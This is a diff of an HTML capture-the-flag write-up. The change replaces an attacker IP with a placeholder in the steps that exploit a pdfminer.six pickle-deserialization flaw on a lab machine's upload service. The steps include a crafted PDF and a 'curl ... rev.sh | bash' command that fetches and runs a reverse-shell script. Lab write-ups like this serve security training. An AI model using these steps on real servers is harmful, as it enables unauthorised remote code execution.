@@ -113,9 +113,9 @@ research   [Status: 200, Size: 3152]</pre>
       <p><code>research.bedside.htb</code> hosts a file upload. A response header gives away the backend:</p>
       <pre>X-Powered-By: pdfminer.six</pre>
       <p>pdfminer.six is vulnerable to <strong>CVE-2025-64512</strong>: a crafted PDF can smuggle a <strong>pickle.gz</strong> file that gets deserialized on the server. The PoC ships two helpers - <code>mkpickle.py</code> builds a gzipped pickle whose payload is our command, and <code>mkpdf.py</code> wraps it in a PDF with a configurable extraction path.</p>
-      <pre>python mkpickle.py 'curl http://10.10.14.185:8000/rev.sh | bash' pwn.pickle.gz
+      <pre>python mkpickle.py 'curl http://[IP]:8000/rev.sh | bash' pwn.pickle.gz
 [+] pwn.pickle.gz (106 bytes)
-    cmd: curl http://10.10.14.185:8000/rev.sh | bash
+    cmd: curl http://[IP]:8000/rev.sh | bash
 
 python mkpdf.py -o pwn.pdf -p '/var/www/research.bedside.htb/uploads' pwn
 [+] pwn.pdf -&gt; /var/www/research.bedside.htb/uploads/pwn.pickle.gz</pre>
